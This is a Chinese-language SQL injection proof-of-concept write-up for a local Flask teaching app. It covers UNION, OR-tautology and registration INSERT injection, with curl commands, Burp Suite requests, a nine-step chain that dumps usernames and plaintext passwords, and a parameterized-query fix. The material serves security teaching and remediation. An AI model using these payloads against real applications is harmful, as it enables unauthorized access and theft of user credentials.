# SQL 注入漏洞 POC（Proof of Concept）

> 实验目标：`user_management` Flask 应用的搜索和注册功能
> 漏洞类型：基于 f-string 拼接的 SQL 注入（字符型，单引号闭合）

---

## 环境准备

确保 Flask 应用已启动：

```bash
cd user_management
python app.py
```

浏览器访问：`http://127.0.0.1:5000`

---

## POC 1：UNION 注入获取任意数据

### 原理

利用 `UNION SELECT` 将自定义数据合并到查询结果中。

### 步骤

**① 先登录获取 session cookie：**

```bash
curl http://127.0.0.1:5000/login \
  -d "username=admin&password=admin123" \
  -c /tmp/cookies.txt
```

**② UNION 注入：向搜索结果中插入自定义数据：**

```bash
curl "http://127.0.0.1:5000/search?keyword=%27%20UNION%20SELECT%201,%27inj%27,%27inj@x.com%27,%27138%27%20--%20" \
  -b /tmp/cookies.txt | grep "inj"
```

### 预期输出

搜索结果中出现 `inj` 用户名，以及 `inj@x.com` 邮箱。

### SQL 变换过程

```sql
-- 原 SQL
SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'

-- 输入 keyword = ' UNION SELECT 1,'inj','inj@x.com','138' -- 

-- 生成的 SQL
SELECT * FROM users WHERE username LIKE '%' UNION SELECT 1,'inj','inj@x.com','138' -- %' OR email LIKE '%' UNION SELECT 1,'inj','inj@x.com','138' -- %'
```

### 为什么列数必须是 4？

```
SELECT * FROM users          → 返回 4 列（id, username, email, phone）
UNION SELECT 1,'inj','inj@x.com','138'  → 也必须返回 4 列
```

如果列数不匹配，SQLite 会报错：
> SELECTs to the left and right of UNION do not have the same number of result columns

---

## POC 2：OR 注入搜索全部用户

### 原理

利用 `OR '1'='1` 永真条件，绕过 WHERE 限制，返回所有用户。

### 命令

```bash
curl "http://127.0.0.1:5000/search?keyword=%27%20OR%20%271%27%3D%271" \
  -b /tmp/cookies.txt
```

### 预期输出

显示数据库中所有用户，包括 admin、alice 和其他注册用户。

### SQL 变换过程

```sql
-- 原 SQL
SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'

-- 输入 keyword = ' OR '1'='1

-- 生成的 SQL
SELECT * FROM users WHERE username LIKE '%' OR '1'='1%' OR email LIKE '%' OR '1'='1%'
                                        ^^^^^^^^^^^
                                        永真条件，所有行都匹配
```

### 结果

返回 `users` 表中的全部数据，攻击者可以看到所有注册用户的账号信息。

---

## POC 3：注册功能 SQL 注入

### 原理

注册功能同样使用 f-string 拼接 SQL，可以在用户名中插入 SQL 语句，实现恶意数据写入。

### 命令

```bash
curl http://127.0.0.1:5000/register \
  -d "username=hacker', 'pass', 'h@x.com', '123')--&password=irrelevant"
```

### SQL 变换过程

```sql
-- 原 SQL
INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')

-- 输入 username = hacker', 'pass', 'h@x.com', '123')--
-- 输入 password = irrelevant

-- 生成的 SQL
INSERT INTO users (username, password, email, phone) VALUES ('hacker', 'pass', 'h@x.com', '123')--', 'irrelevant', '', '')
                                                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                    插入了一条完全由攻击者控制的数据
```

---

## POC 4：完整的 9 步 SQL 注入流程

| 步骤 | 说明 | Payload | 结果 |
|------|------|---------|------|
| ① | 检测注入点 | `' OR 1=1 -- ` | ✅ 返回所有用户 |
| ② | 判断类型 | 字符型（单引号包裹） | ✅ 字符型 |
| ③ | 确定闭合方式 | `'`（单引号） | ✅ 单引号闭合 |
| ④ | 探测列数 | `' ORDER BY 4 -- `（成功）<br>`' ORDER BY 5 -- `（报错） | ✅ 4列 |
| ⑤ | 定位回显位置 | `' UNION SELECT 1,2,3,4 -- ` | ✅ 4列全部回显 |
| ⑥ | 获取表信息 | `' UNION SELECT 1,2,group_concat(name),4 FROM sqlite_master WHERE type='table' -- ` | ✅ users |
| ⑦ | 获取列名 | `' UNION SELECT 1,2,sql,4 FROM sqlite_master WHERE name='users' -- ` | ✅ id,username,password,email,phone |
| ⑧ | 拖库（用户名+密码） | `' UNION SELECT 1,username,password,phone FROM users -- ` | ✅ admin:admin123 |
| ⑨ | 利用注册注入 | 注册时在用户名中插入 SQL | ✅ 写入虚假数据 |

---

## Burp Suite 测试方法

### 步骤

1. **配置代理**：浏览器设置代理为 `127.0.0.1:8080`
2. **登录**：访问 `http://127.0.0.1:5000/login`，用 admin/admin123 登录
3. **搜索拦截**：在首页搜索框输入 `admin`，Burp Suite 拦截到 `GET /search?keyword=admin`
4. **发送到 Repeater**：右键 → Send to Repeater
5. **修改 keyword 参数测试注入**：

```http
# 原始请求
GET /search?keyword=admin HTTP/1.1

# 测试1：OR 万能密码 → 返回所有用户
GET /search?keyword=admin' OR '1'='1 HTTP/1.1

# 测试2：UNION 注入 → 返回自定义数字
GET /search?keyword=' UNION SELECT 1,2,3,4-- HTTP/1.1

# 测试3：UNION 注入 → 导出用户名和邮箱
GET /search?keyword=' UNION SELECT 1,username,email,phone FROM users-- HTTP/1.1

# 测试4：UNION 注入 → 导出用户名和密码
GET /search?keyword=' UNION SELECT 1,username,password,phone FROM users-- HTTP/1.1
```

6. **观察响应**：每次点击 Send，查看响应中表格数据的变化

---

## 漏洞原因分析

### 问题代码

```python
# app.py 搜索功能（第 56-58 行）
sql = f"SELECT id, username, email, phone FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
print(f"[SQL] 执行查询: {sql}")
c.execute(sql)

# app.py 注册功能（第 81 行）
sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
print(f"[SQL] 执行插入: {sql}")
c.execute(sql)
```

### 问题分析

| 问题 | 说明 |
|------|------|
| **f-string 拼接** | 用户输入直接拼入 SQL 语句，未做任何转义 |
| **无输入过滤** | 没有过滤单引号 `'`、分号 `;`、注释符 `--` 等特殊字符 |
| **控制台打印 SQL** | SQL 语句直接打印到控制台，泄露查询逻辑 |
| **密码明文存储** | 数据库中密码为明文，一旦注入成功直接泄露 |

### 修复方案

```python
# ✅ 正确做法：使用参数化查询（问号占位符）
c.execute("SELECT * FROM users WHERE username LIKE ? OR email LIKE ?",
          (f'%{keyword}%', f'%{keyword}%'))

c.execute("INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)",
          (username, password, email, phone))
```

---

## 总结

| POC | 漏洞点 | 危害等级 | 影响 |
|-----|--------|---------|------|
| POC 1 | 搜索 - UNION 注入 | 🔴 严重 | 任意数据窃取 |
| POC 2 | 搜索 - OR 注入 | 🟠 高危 | 遍历全部用户 |
| POC 3 | 注册 - 写入注入 | 🔴 严重 | 恶意数据写入 |
| POC 4 | 完整注入链 | 🔴 严重 | 全量数据泄露 |

---

*本 POC 文档仅供安全教学演示使用，请勿用于非法用途。*
